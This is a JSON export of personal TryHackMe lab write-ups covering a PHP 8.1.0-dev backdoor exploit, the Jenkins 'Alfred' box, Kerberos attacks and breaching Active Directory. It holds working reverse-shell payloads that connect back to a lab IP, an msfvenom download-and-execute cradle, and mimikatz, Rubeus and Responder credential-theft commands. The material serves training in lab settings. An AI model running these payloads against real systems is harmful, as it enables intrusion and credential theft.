\"10.18.12.227\"\n\tlport  = 9999\n\t\n\t\n\t# Craft the payload \u0026 send it\n\tURL = f\"http://{target}/\"\n\tpayload = f'bash -c \\\"bash -i \u003e\u0026 /dev/tcp/{lhost}/{lport} 0\u003e\u00261\\\"'\n\t\n\ts = requests.Session()\n\theaders = {\n\t    \"User-Agentt\": f\"zerodiumsystem('{payload}');\"\n\t}\n\tprint(headers)\n\t\n\tinject = s.get(URL, headers=headers, allow_redirects = False)\n\t```\n- setup a listener *(I used [pwncat-cs](https://github.com/calebstewart/pwncat))*\n\t- ![[write-ups/images/Pasted image 20220809205127.png]]\n\n\n## Refs\n- https://flast101.github.io/php-8.1.0-dev-backdoor-rce/\n\n## See Also\n- [[write-ups/THM]]","lastmodified":"2022-09-07T18:56:29.171584296Z","tags":null},"/write-ups/thm/alfred":{"title":"Alfred","content":"\n## Initial Foothold\n![[write-ups/images/Pasted image 20220820235756.png]]\n\nOn `8080` I tried `admin:admin` and we are in due to default credentials. \n![[write-ups/images/Pasted image 20220820230201.png]]\n\nBrowsing a little bit the application, I found out that I can create a `New Item` as `Freestyle Project`\n![[write-ups/images/Pasted image 20220820230609.png]]\n\nThen we're prompted to configure it. Under `Build` we can `add build step` \u0026 execute a windows batch command\n![[write-ups/images/Pasted image 20220820230713.png]]\n\nI'm going to use the [nishang reverse powershell script](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) to get a connection back. So we need to download the `ps1` script on the target machine \u0026 execute `Invoke-PowerShellTcp`\n- start http server to serve the `revsh.ps1` file: `python -m http.server 8080`\n- add our payload in `Build`, apply \u0026 save\n\t- ![[write-ups/images/Pasted image 20220820232112.png]]\n- start listener \u0026 `Build now`\n\t- ![[write-ups/images/Pasted image 20220820232228.png]]\n\n\n### Stabilize shell\n- use `msfvenom` to create a meterpreter revshell: `msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.18.12.227 LPORT=1234 -f exe -o msh.exe`\n- transfer file on target: `powershell \"(New-Object System.Net.WebClient).Downloadfile('http://10.18.12.227:8080/msh.exe','msh.exe')\"`\n- setup listener: `use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 10.18.12.227; set LPORT 1234; run`\n- execute: `Start-Process \"msh.exe\"`\n\n## Privesc\nSince the box starts with an introduction on [Access Tokens](Access Tokens.md), we most definitely need to perform a [token Impersonation attack](Token Impersonation.md). \n- so I took a look @ my privileges\n\t- ![[write-ups/images/Pasted image 20220820233928.png]]\n- then went back to my meterpreter \u0026 `load incognito` which will load the modules required to impersonate another users token\n\t- ![[write-ups/images/Pasted image 20220821034159.png]]\n- now we can list all the available tokens\n\t- ![[write-ups/images/Pasted image 20220820234629.png]]\n- going forward, we want to impersonate the `BUILTIN\\Administrators` token, list the available processes \u0026 migrate to something owned by `NT AUTHORITY\\SYSTEM` in order to get a privileged shell. In this case I choose [lsass.exe](lsass.exe (Local Security Authority Subsystem Service).md)\n\t- ![[write-ups/images/Pasted image 20220820234648.png]]\n\t- ![[write-ups/images/Pasted image 20220820234706.png]]\n\t- ![[write-ups/images/Pasted image 20220820234722.png]]\n\n\n## Refs\n- [Abusing Token Privileges for LPE](https://www.exploit-db.com/papers/42556)\n- [Token Impersonation Notes](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/access-token-manipultion/token-impersonation)\n\n## See Also\n- [[write-ups/THM]]\n- [[Access Tokens]]\n- [[sheets/Token Impersonation]]\n","lastmodified":"2022-09-07T18:56:29.171584296Z","tags":null},"/write-ups/thm/attacking-kerberos":{"title":"attacking-kerberos","content":"\n## What is Kerberos ?\n- Kerberos is the default authentication service for Microsoft Windows domains\\\n- an authentication protocol, not authorization. It allows identification 4 each user, but doesn't validate to which reources/services can the user access\n- intented to be more secure than NTLM ¬†by using third party ticket authorization as well as stronger encryption\n- several **agents** work together to provide authentication in Kerberos:\n\t- Client/User who wants to access the service\n\t- Application Server *(AP)* which offers the service required by the user\n\t- Key Distribution Center *(KDC)*: the main service, responsible of issuing the tickets, installed on the [AD -- Domain Controllers (DC)](../../sheets/AD -- Domain Controllers (DC).md) \u0026 supported by the Authentication Service *(AS)*, which issues TGTs\n\n### Tickets\nThe main structures handled by Kerberos. They're delivered to the users in order to be used by them to perform several actions.\n\n- **Ticket Granting Service (TGS)**: users can use to authenticate against a service. It is encrypted with the service key\n\t- ![[write-ups/images/Pasted image 20220619113227.png]]\n- **Ticket Granting Ticket (TGT)**: presented to the KDC to request for TGSs. It is encrypted with the KDC key\n\t- ![[write-ups/images/Pasted image 20220619113222.png]]\n\n### Privilege Attribute Certificate *(PAC)*\nIt's a structure included in almost every ticket. This structure contains the privileges of the user and it is signed with the KDC key.\n\nPAC verification consists of checking only its signature, without inspecting if privileges inside of PAC are correct. Furthermore, a client can avoid the inclusion of the PAC inside the ticket by specifying it in `KERB-PA-PAC-REQUEST` field of ticket request\n\n### Types of mesages\nKerberos uses differents kinds of messages. The most interesting are the following:\n\n|                 |                                                                 |\n| --------------- | --------------------------------------------------------------- |\n| **KRB_AS_REQ**  | used to request the TGT to KDC                                  |\n| **KRB_AS_REP**  | used to deliver the TGT by KDC                                  |\n| **KRB_TGS_REQ** | used to request the TGS to KDC, using the TGT                   |\n| **KRB_TGS_REP** | used to deliver the TGS by KDCM                                 |\n| **KRB_AP_REQ**  | used to authenticate a user against a service, using the TGS    |\n| **KRB_AP_REP**  | (optional) used by servicee to identify itself against the user |\n| **KPB_ERROR**   | msg to communicate error conditions                             | \n\n\u003e **NOTE**: Additionally, even if it is not part of Kerberos, but NRPC, the **AP** optionally could use the `KERB_VERIFY_PAC_REQUEST` message to send to **KDC** the signature of **PAC**, and verify if it is correc\n\nSummary of msgs sequency to perform auth:\n![[write-ups/images/Pasted image 20220619113911.png]]\n\n### Kerberos Authentication Overview\n![[write-ups/images/Pasted image 20220619072424.png]]\n1. client requests an Authentication Ticket or Ticket Granting Ticket (TGT)\n2. Key Distribution Center verifies the client and sends back an encrypted TGT\n3. client sends the encrypted TGT to the Ticket Granting Server (TGS) with the Service Principal Name (SPN) of the service the client wants to access\n4. KDC verifies the TGT of the user and that the user has access to the service, then sends a valid session key for the service to the client\n5. client requests the service and sends the valid session key to prove the user has access\n6. the service grants access\n\n### Attack Privilege Requirement\n|                      |                                         |\n| -------------------- | --------------------------------------- |\n| Kerbrute Enumeration | no domain access required               |\n| Pass the Ticket      | access as a user to the domain required |\n| Kerberoasting        | access as any user required             |\n| AS-REP Roasting      | access as any user required             |\n| Golden Ticket        | full domain compromise *(domain admin)* |\n| Silver Ticket        | service hash required                   |\n| Skeleton Key         | full domain compromise *(domain admin)* | \n\n## Abusing Pre-Auth\n- by brute-forcing in pre-auth we don't trigger the account failed to log an event which can throw up red flags to the blue team\n- we can brute-force by only sending a single¬†UDP¬†frame to the KDC allowing you to enumerate the users on the domain from a wordlist\n- using [kerbrute]([https://github.com/ropnop/kerbrute/releases](https://github.com/ropnop/kerbrute/releases)):\n\t- ![[write-ups/images/Pasted image 20220619120038.png]]\n\n## Harvesting \u0026 Brute-Forcing Tickets\n- harvesting tickets uing [Rubeus](https://github.com/GhostPack/Rubeus): `Rubeus.exe harvest /interval:30`\n\t- ![[write-ups/images/Pasted image 20220619120554.png]]\n- add the domain controller domain name to the windows host file: `echo 10.10.72.127 CONTROLLER.local \u003e\u003e C:\\Windows\\System32\\drivers\\etc\\hosts`\n- *\"spray\"* against all found user accounts in the domain to find which one may have that password: `Rubeus.exe brute /password:Password1 /noticket`\n\t- ![[write-ups/images/Pasted image 20220619122207.png]]\n\n\u003e **NOTE**: be mindful of how you use this attack as it may lock you out of the network depending on the account lockout policies\n\n## Kerberoasting\n- with `rubues`: `Rubeus.exe kerberoast`\n- with [impacket](https://github.com/SecureAuthCorp/impacket): `sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.72.127 -request`\n\t- ![[write-ups/images/Pasted image 20220619122329.png]]\n- and crack the hash: `hashcat -m 13100 -a 0 hash.txt Pass.txt`\n\t- ![[write-ups/images/Pasted image 20220619122724.png]]\n\n### What Can a Service Account do?\n- once you havee a service account there's various ways to further exfiltrate data or collecting loot depending on whether the service is a domain admin or not\n- if a domain admin you have control similar to that of a golden/silver ticket and can now gather loot such as dumping the NTDS.dit\n- if not a domain admin you can use it to log into other systems and pivot or escalate or you can use that cracked password to spray against other service and domain admin accounts\n\n\n\n### Mitigations\n**Strong Service Passwords**: if the service account passwords are strong then kerberoasting will be ineffective\n\n**Don't Make Service Accounts Domain Admins**: service accounts don't need to be domain admins, kerberoasting won't be as effective if you don't make service accounts domain admins.\n\n## AS-REP Roasting\nSimilar to Kerberoasting, AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled\n- During pre-auth the user's hash will be used to encrypt a timestamp that the DC will attempt to decrypt in order to validate that the right hash is being used and is not replaying a previous request\n- After validation, the KDC will then issue a TGT for the user\n- If pre-auth is disabled we can **request any authentication data for any user and the KDC will return an encrypted TGT** *(which can further be cracked offline)*\n\n![[write-ups/images/Pasted image 20220619123731.png]]\n\nIf we crack the hashes: `hashcat -m 18200 AS-REP Pass.txt` we get: `admin2:P@$$W0rd2, user3:Password3`\n![[write-ups/images/Pasted image 20220619123955.png]]\n\n### Mitigation\n**Have a strong password policy**. With a strong password, the hashes will take longer to crack making this attack less effective\n\n**Don't turn off Kerberos Pre-Authentication unless it's necessary** there's almost no other way to completely mitigate this attack other than keeping Pre-Authentication on.\n\n## Pass the Ticket\nPass the ticket works by dumping the TGT from the LSASS memory of the machine. The [[write-ups/thm/core-windows-processes#lsass exe|lsass.exe]] stores credentials for the AD server \u0026 Kerberos tickets along w other creds in memory\n\nA known tool exactly for that is [mimikatz](https://github.com/ParrotSec/mimikatz). This will give us a .kirbi ticket which can be used to gain domain admin if a domain admin ticket is in the LSASS memory.\n\nYou can think of a pass the ticket attack like reusing an existing ticket were not creating or destroying any tickets here were simply reusing an existing ticket from another user on the domain and impersonating that ticket.\n\n![[write-ups/images/Pasted image 20220619124706.png]]\n\n- dump all `.kirbi` tickets in the curr dir w `mimikatz`:\n\t- ![[write-ups/images/Pasted image 20220619125509.png]]\n- pass the ticket \u0026 impersonate\n\t- find someone valuable to impersonate, in our case `Administrator`\n\t- ![[write-ups/images/Pasted image 20220619125719.png]]\n\t- verifying that we successfully impersonated the ticket by listing our cached tickets: `klist`\n\t- ![[write-ups/images/Pasted image 20220619125416.png]]\n\n\u003e **NOTE**: this is only a POC to understand how to pass the ticket and gain domain admin, so don't take this as a definitive guide of how to run this attack, since the approach might change based on the environment\n\n### Mitigation\n**Don't let your domain admins log onto anything except the domain controller**: this is something so simple however a lot of domain admins still log onto low-level computers leaving tickets around that we can use to attack and move laterally with.\n\n## Golden / Silver Ticket Attacks\n- a silver ticket can sometimes be better used in engagements rather than a golden ticket because it is a little more discreet\n\t- silver ticket: limited to the service that is targeted\n\t- golden ticket: has access to any Kerberos service\n- **use-scenario**: you want to access the domain's SQL server, but the curr compromised user doesn't have access\n\t- find an accessible service account to get a foothold with by kerberoasting\n\t- then dump the service hash\n\t- and finally impersonate their TGT in order to request a service ticket for the SQL service\n\n### What's the difference between a KRBTGT and a TGT ?\n- a KRBTGT is the service account for the KDC, which issues all of the tickets to the clients\n- by impersonating this acc \u0026 creating a golden ticket you give yourself the ability to create a service ticket for anything you want\n\n### Hands-On\n- dump the hash as well as the security identifier needed to create a Golden Ticket *(to create a silver ticket change `/name:` to dump the hash of either a domain admin / service acc you're interested in)*\n\t- ![[write-ups/images/Pasted image 20220619131924.png]]\n- create a golden/silver ticket: `Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:` *(4 silver ticket ¬†simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103)*\n\t- ![[write-ups/images/Pasted image 20220619132541.png]]\n- use the golden/silver ticket to access other machines: `misc::cmd` which will open a new elevated cmd with the given ticket\n\n## Kerberos Backdoors\nUnlike the golden and silver ticket attacks a Kerberos backdoor is much more subtle because it acts similar to a rootkit by implanting itself into the memory of the domain forest allowing itself access to any of the machines with a master password\n\nIt works by implanting a skeleton key that abuses the way that the AS-REQ validates encrypted timestamps. A skeleton key only works using Kerberos RC4 encryption.\n\nThe DC then tries to decrypt the timestamp with the users NT hash, once a skeleton key is implanted the domain controller tries to decrypt the timestamp using both the user NT hash and the¬†skeleton key NT hash allowing you access to the domain forest\n\n\u003e **NOTE**: the skeleton key will not persist by itself because it runs in the memory\n\n---\n\n## References\n- [https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a](https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a)[](https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a)\n- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)[](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)\n- [https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1](https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1)[](https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1)\n- [https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/](https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/)[](https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/)\n- [https://www.varonis.com/blog/kerberos-authentication-explained/](https://www.varonis.com/blog/kerberos-authentication-explained/)[](https://www.varonis.com/blog/kerberos-authentication-explained/)\n- [https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf)[](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf)\n- [https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493862736.pdf](https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493862736.pdf)[](https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493862736.pdf)\n- [https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf](https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf)\n\n## See Also\n- [[write-ups/THM]]\n","lastmodified":"2022-09-07T18:56:29.171584296Z","tags":null},"/write-ups/thm/autopsy":{"title":"autopsy","content":"\n- What is the full name of the operating system version?\n\t- ![[write-ups/images/Pasted image 20220630063830.png]]\n- What percentage of the drive are documents? Include the % in your answer\n\t- ![[write-ups/images/Pasted image 20220630064130.png]]\n- The majority of file events occurred on what date? (MONTH DD, YYYY)\n\t- ![[write-ups/images/Pasted image 20220630064330.png]]\n- What is the name of an Installed Program with the version number of 6.2.0.2962?\n\t- ![[write-ups/images/Pasted image 20220630064543.png]]\n- A user has a Password Hint. What is the value?\n\t- ![[write-ups/images/Pasted image 20220630064626.png]]\n- Numerous SECRET files were accessed from a network drive. What was the IP address?\n\t- ![[write-ups/images/Pasted image 20220630064756.png]]\n- What web search term has the most entries?\n\t- ![[write-ups/images/Pasted image 20220630064853.png]]\n- What was the web search conducted on 3/25/2015 21:46:44?\n\t- ![[write-ups/images/Pasted image 20220630064932.png]]\n- What binary is listed as an Interesting File?\n\t- ![[write-ups/images/Pasted image 20220630065043.png]]\n- What self-assuring message did the 'Informant' write for himself on a Sticky Note? (no spaces)\n\t- ![[write-ups/images/Pasted image 20220630065239.png]]\n- Using the Timeline, how many results were there on 2015-01-12?\n\t- ![[write-ups/images/Pasted image 20220630065725.png]]\n\n\n---\n\n## References\n\n## See Also\n- [[write-ups/THM]]","lastmodified":"2022-09-07T18:56:29.171584296Z","tags":null},"/write-ups/thm/breaching-active-directory":{"title":"Breaching Active Directory","content":"\nCovers techniques to recover AD credentials in this network:\n- NTLM Authenticated Services\n- LDAP Bind Credentials\n- Authentication Relays\n- Microsoft Deployment Toolkit\n- Configuration Files\n\nWe can use these techniques on a security assesment by targeting systems of an organisation that are internet-facing or by implanting a rogue device on the organisation's network\n\n- **Setup**\n\t- configure DNS by adding `DNS=\u003cTHMDC IP\u003e` to the `/etc/systemd/resolved.conf`¬†file \n\t- save it \u0026 restart the service: `systemctl restart systemd-resolved`\n\t- test modifications: `nslookup thmdc.za.tryhackme.com`\n\t\n## OSINT \n[OSINT](OSINT) is used to disscover information online. In the case of AD this can happen for several reasons such as:\n- Users who ask questions on public forums such as¬†[Stack Overflow](https://stackoverflow.com/)¬†but disclose sensitive information such as their credentials in the question.\n- Developers that upload scripts to services such as¬†[Github](https://github.com/)¬†with credentials hardcoded.\n- Credentials being disclosed in past breaches since employees used their work accounts to sign up for other external websites. Websites such as¬†[HaveIBeenPwned](https://haveibeenpwned.com/)¬†and¬†[DeHashed](https://www.dehashed.com/)¬†provide excellent platforms to determine if someone's information, such as work email, was ever involved in a publicly known data breach.\n\nA detailed room on Red Team OSINT can be found¬†[here.](https://tryhackme.com/jr/redteamrecon)\n\n## Phising\nPhishing¬†is another excellent method to breach AD. Phishing usually entices users to either provide their credentials on a malicious web page or ask them to run a specific application that would install a Remote Access Trojan (RAT) in the background. This is a prevalent method since the RAT would execute in the user's context, immediately allowing you to impersonate that user's AD account. This is why phishing is such a big topic for both Red and Blue teams.\n\nA detailed room on phishing can be found¬†[here.](https://tryhackme.com/module/phishing)\n\n## NTLM Authentication Services\n- [New Technology LAN Manager (NTLM)](New Technology LAN Manager (NTLM)) is the suite of security protocols used to authenticate users' identities in [AD](../../sheets/Active Directory.md)\n- services that use NetNTLM can also be exposed to the internet. The following are some of the popular examples:\n\t- Internally-hosted Exchange (Mail) servers that expose an Outlook Web App (OWA) login portal.\n\t- Remote Desktop Protocol (RDP) service of a server being exposed to the internet.\n\t- Exposed VPN endpoints that were integrated with AD.\n\t- Web applications that are internet-facing and make use of NetNTLM\n- allows the application to play the role of a middle man between the client and AD. All authentication is forwarded to the [AD -- Domain Controllers (DC)](../../sheets/AD -- Domain Controllers (DC).md) in the form of a challenge which will authenticate the user\n\t- ![[write-ups/images/Pasted image 20220618195656.png]]\n\t- it prevents the application from storing AD credentials, which should only be stored on a Domain Controller\n### Password Spraying\n- since most AD envs have account lockout configured, we won't be able to run a full brute-force attack\n- instead of trying multiple different passwords *(which will trigger an alert/account lockout)* we choose 1 passwoird and attempt to authenticate with all the usernames acquired\n\u003e **NOTE**: ¬†these types of attacks can be detected due to the amount of failed authentication attempts they will generate\n\n- we're provided with a list of usernames discovered during a red team OSINT exercise\n\t- also indicated the organisation's initial onboarding password: `Changeme123`\n- we're gonna use a simple python script to try the default password for all users @ the web app *([http://ntlmauth.za.tryhackme.com](http://ntlmauth.za.tryhackme.com/))*\n\n## LDAP Blind Credentials\n- another method of AD authentication that applications can use is Lightweight Directory Access Protocol (LDAP) authentication\n- similar to NTLM authentication, but the application directly verifies the user's creds\n\t- has a pair of AD creds that it can use to query LDAP \u0026 verify\n- popular mechanism amongst third-party (non-Microsoft) applications that integrate with AD *(e.g Gitlab, Jenkins, custom web-apps, printers, VPNs)*\n- process of authentication through LDAP:\n\t- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/d2f78ae2b44ef76453a80144dac86b4e.png)\n- can use the same typee of attacks as those leveraged against NTLM, however, since LDAP auth requires a set of AD credentials, it opens up additional attack avenues\n\t- we can attempt to recover the AD credentials used by the service to gain authenticated access to AD\n\t- once you gain a foothold on the correct host, such as a Gitlab server, it might be as simple as reading the configuration files to recover these AD credentials\n\n### LDAP Pass-Back\n- can be performed when already have access to device's configuration *(e.g printer with default creds)*\n- then we alter the LDAP conf such as the IP or hostname of the device is redirected to our machine so we can intercept the authentication attempt \u0026 recover the credentials\n- we have an interesting endpoint @ `http://printer.za.tryhackme.com/settings`\n\t- ![[write-ups/images/Pasted image 20220619004402.png]]\n- can redirect to our ip adddr \u0026 try to catch the auth req: `nc -nvlp 389`\n\t- ![[write-ups/images/Pasted image 20220619004119.png]]\n\t- `suppportedCapabilities` indicates that we have a problem\n\t- before the printer sends the creds, it's trying to negotiaate the LDAP auth method details =\u003e will select the most secure authentication method that both the printer and the LDAP server support\n\t- depending on the auth method used the creds will not be sent over in cleartext *(in some casess they'll not be transmitted over the network @ all)*\n\n### Rogue LDAP server\n- install requirments\n\t```bash\n\tsudo apt-get update \u0026\u0026 sudo apt-get -y install slapd ldap-utils \u0026\u0026 sudo systemctl enable slapd\n\t```\n- reconfigure ldap server: `sudo dpkg-reconfigure -p low slapd`\n\t- domain name \u0026 organizaation name: `za.tryhackme.com`\n\t- remove db when slapd purged: no\n\t- move old database: yes\n- downgrade the supported auth mechanisms to only `PLAIN` \u0026 `LOGIN` from `olcSaslSecProps.ldif`\n\t```\n\tdn: cn=config \n\treplace: olcSaslSecProps \n\tolcSaslSecProps: noanonymous,minssf=0,passcred\n\t```\n- patch our LDAP server config from the above file: `sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif \u0026\u0026 sudo service slapd restart`\n- verify if everything's good\n\t- ![[write-ups/images/Pasted image 20220619021230.png]]\n- capture ldap credentials: `tcpdump -SX -i tun0 tcp port 389 -w ldap_pass -vv`\n- go to `http://printer.za.tryhackme.com/settings` \u0026 send LDAP auth\n- ![[write-ups/images/Pasted image 20220619021410.png]]\n\n## Authentication Relays\n\n- setup [responder](https://github.com/lgandx/Responder): `responder -I tun0` A\n\t- ![[write-ups/images/Pasted image 20220619025323.png]]\n- crack the hash: `hashcat -m 5600 svcFileCopy_hash passwordlist.txt`\n\t- ![[write-ups/images/Pasted image 20220619025204.png]]\n\n## Microsoft Deployment Toolkit\n\n- Microsoft Deployment Toolkit (MDT) is a Microsoft service that assists with automating the deployment of Microsoft Operating Systems (OS)\n- large organizations use MDT to deploy new images in their esstate more efficiently since the base images can be maintained \u0026 updated in a central location\n- usually MDT is integrated with Microsoft's System Center Configuration Manager *(SCCM)*: which manages all updates for all Microsoft applications, services, and operating systems\n\t- allows the IT team to preconfigure and manage boot images\n\t- when a new machine needs configuration, just plug in the network \u0026 everything happens automatically *(e.g install Office365 \u0026 AV of choice)*\n- SCCM can be seen as almost an expansion and the big brother to MDT\n\t- once the software is installed, SSCM does this type of patch management\n\t- allows the IT team to review available updates to all software installed across the estate\n\t- can also test these patches in a sandbox environment to ensure they are stable before centrally deploying them to all domain-joined machines\n\n\n### PXE Boot\n- Use PXE boot to allow new devices that are connected to the network to load and install the¬†OS¬†directly over a network connection\n- usually integrated with DHCP, which means that if DHCP assigns an IP lease, the host is allowed to request the PXE boot image and start the network OS installation process. Communication flow is shown below\n\t- ![[write-ups/images/Pasted image 20220619025535.png]]\n- once that's finished the client will use a TFTP connection to download the PXE boot image\n- this is quite often targeted by adveraries since one can:\n\t- inject a privilege escalation vector, such as a Local Administrator account, to gain Administrative access to the¬†OS¬†once the PXE boot has been completed\n\t- perform password scraping attacks to recover AD credentials used during the install\n### Exploitation\n\n## Configuration Files\n- configuration files are an excellent avenue to explore in an attempt to recover AD credentials. Depending on the host that was breached, various configuration files may be of value for enumeration *(e.g webapp, service, registry keys, centrally deployed apps)*\n- several enumeration scripts, such as¬†[Seatbelt](https://github.com/GhostPack/Seatbelt), can be used to automate this process.\n- sql enumeration: \n\t- ![[write-ups/images/Pasted image 20220619041116.png]]\n\t\t```sql\n\t\tCREATE TABLE AGENT_PROXY_CONFIG(\n\t\t\tPROXY_USAGE INTEGER NOT NULL, \n\t\t\tBYPASS_LOCAL INTEGER NOT NULL, \n\t\t\tALLOW_USER_CONFIG INTEGER NOT NULL, \n\t\t\tEXCLUSION_LIST TEXT, \n\t\t\tSYSTEM_PROXY_HTTP_AUTH_REQD INTEGER,\n\t\t\tSYSTEM_PROXY_HTTP_USER TEXT, \n\t\t\tSYSTEM_PROXY_HTTP_PASSWD TEXT,\n\t\t\tSYSTEM_PROXY_FTP_AUTH_REQD INTEGER,\n\t\t\tSYSTEM_PROXY_FTP_USER TEXT, \n\t\t\tSYSTEM_PROXY_FTP_PASSWD TEXT, \n\t\t\tPRIMARY KEY (PROXY_USAGE, BYPASS_LOCAL, ALLOW_USER_CONFIG) \n\t\t\t\tON CONFLICT REPLACE\n\t\t);\n\t\t```\n\t- ![[write-ups/images/Pasted image 20220619041608.png]]\n- ![[write-ups/images/Pasted image 20220619052118.png]]\n\n## Mitigation\n- **User awareness and training** - The weakest link in the cybersecurity chain is almost always users. Training users and making them aware that they should be careful about disclosing sensitive information such as credentials and not trust suspicious emails reduces this attack surface.\n- **Limit the exposure of AD services and applications online** - Not all applications must be accessible from the internet, especially those that support NTLM and LDAP authentication. Instead, these applications should be placed in an intranet that can be accessed through a VPN. The VPN can then support multi-factor authentication for added security.\n- **Enforce Network Access Control (NAC)** - NAC can prevent attackers from connecting rogue devices on the network. However, it will require quite a bit of effort since legitimate devices will have to be allowlisted.\n- **Enforce SMB Signing** - By enforcing SMB signing, SMB relay attacks are not possible.\n- **Follow the principle of least privileges** - In most cases, an attacker will be able to recover a set of AD credentials. By following the principle of least privilege, especially for credentials used for services, the risk associated with these credentials being compromised can be significantly reduced.\n\n---\n\n## References\n- [Taking over Windows Workstations thanks to LAPS and PXE](https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps/)\n\n## See Also\n- [[write-ups/THM]]\n","lastmodified":"2022-09-07T18:56:29.171584296Z","tags":null},"/write-ups/thm/committed":{"title":"committed","content":"\n- since we're given access to the machine I got `commited.zip`  through python's http server: \n\t- ubuntu: `python -m http.server` \n\t- my machine: `wget http://ip-addr/commited.zip`\n- once we `unzip commited.zip` we get 2 files\n\t- ![[write-ups/images/Pasted image 20220808162314.png]]\n- no credential leaks here, but we see that a `.git` dir is present =\u003e we can see the git commit log\n\t\u003e **Tip**: use `git log --oneline --decorate --all --graph` for a nice view\n\t- ![[write-ups/images/Pasted image 20220808162753.png]]\n\t - or by manually looking in the dir\n\t - ![[write-ups/images/Pasted image 20220808162451.png]]\n\t \u003e **NOTE**: by default `git log` only shows us commits from the `master` branch while the other gives us all the commits from all branches *(i.e `dbint`)*. However we can see the full commit log with the `--reflog` \n\t - the commit that catched my eye was the one with the msh `Oops` inside the `dbinit` branch\n- but how can we see the commit changes from past branches? well with `git log -p -\u003cline_nr\u003e` *(have a look @ the manual page `git log --help`)* or with `git show \u003ccommit-id\u003e`\n\t- ![[write-ups/images/Pasted image 20220808162942.png]]\n\n\n## Refs\n- https://git-scm.com/book/en/v2/Git-Basics-Viewing-the-Commit-History\n- https://stackoverflow.com/questions/4786972/get-a-list-of-all-git-commits-including-the-lost-ones\n- https://stackoverflow.com/questions/17563726/how-can-i-see-the-changes-in-a-git-commit\n\n## See Also\n- [[write-ups/THM]]\n","lastmodified":"2022-09-07T18:56:29.171584296Z","tags":null},"/write-ups/thm/core-windows-processes":{"title":"core-windows-processes","content":"\n## TaskManager\n- add columns by right-click on column headers\n- `details`\n\t- good columns to add: `Image path name` \u0026 `command line`\n\t- if the Image path name or Command line is not what it's expected to be, then we can perform a deeper analysis on this process\n- lacks certain important information when analyzing processes, such as **parent process information**\n- where other utilities, such as [Process Hacker](https://processhacker.sourceforge.io/) and [Process Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer) come to the rescue\n- cmd-line equivalents: `tasklist`, `Get-Process` or `ps` *(PowerShell)*, and `wmic`\n\n## System\n\u003e \"_The System process (process ID 4) is the home for a special kind of thread that runs only in kernel mode a kernel-mode system thread. System threads have all the attributes and contexts of regular user-mode threads (such as a hardware context, priority, and so on) but are different in that they run only in kernel-mode executing code loaded in system space, whether that is in Ntoskrnl.exe or in any other loaded device driver. In addition, system threads don't have a user process address space and hence must allocate any dynamic storage from operating system memory heaps, such as a paged or nonpaged pool._\"\n\n### Unusual behavior 4 this process\n- A parent process (aside from System Idle Process (0))\n- Multiple instances of System. (Should only be 1 instance)¬†\n- A different PID. (Remember that the PID will always be PID 4)\n- Not running in Session 0\n\n## Core Procs\n\n### `smss.exe`\n- also known as the **Windows Session Manager**, is responsible for creating new sessions. This is the first user-mode process started by the kernel\n- it starts the kernel mode \u0026 user mode of the Windows subsystem *(more on [NT Architecure](https://en.wikipedia.org/wiki/Architecture_of_Windows_NT))*. Includes: \n\t- `win32k.sys` *(kernel mode)*\n\t- `winrv.dll` *(user mode)*\n\t- `csrss.exe` *(user mode)*\n- `smss.exe`: the first child intance creates child instances in new seshs by copying itself in the new sessions \u0026 self-terminating *(more [here](https://en.wikipedia.org/wiki/Session_Manager_Subsystem))*\n\t- `crss.exe` *(Win subsystem)* \u0026 `wininit.exe` in Session 0 *(isolated win sesh for the OS)*\n\t- `csrss.exe` \u0026 `winlogon.exe` for Session 1 *(user sesh)*\n- any other subsystem listed in the `Required` value of `HKLM\\System\\CurrentControlSet\\Control\\Session Manager\\Subsystems` is also launched\n- also responsible for creating environment variables, virtual memory paging files and starts `winlogon.exe` *(the Windows Logon Manager)*\n\n\n### `csrss.exe` *(Client Server Runtime Process)*\n- user-mode side of the Windows subsystem\n- always running and is critical to system operation\n\t- if terminated it will result in system failure\n\t- responsible for the Win32 console window and process thread creation and deletion\n\t- for each instance `csrsrv.dll`, `basesrv.dll`, and `winsrv.dll` are loaded *(along w 